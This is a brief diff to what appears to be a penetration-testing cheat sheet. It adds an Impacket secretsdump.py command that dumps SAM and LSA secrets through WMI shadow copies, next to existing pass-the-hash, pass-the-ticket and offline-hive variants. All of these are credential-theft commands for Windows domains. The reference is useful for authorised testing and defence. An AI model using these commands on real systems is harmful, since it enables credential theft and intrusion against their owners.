@@ -73,6 +73,9 @@ secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
 # Remote dumping of SAM & LSA secrets (pass-the-ticket)
 secretsdump.py -k -no-pass 'DOMAIN/USER@TARGET'
 
+# Remote dumping of SAM & LSA secrets via WMI Shadow Copy (no RemoteRegistry required)
+secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET' -use-remoteSSWMI
+
 # Offline dumping of LSA secrets from exported hives
 secretsdump.py -security '/path/to/security.save' -system '/path/to/system.save' LOCAL
 
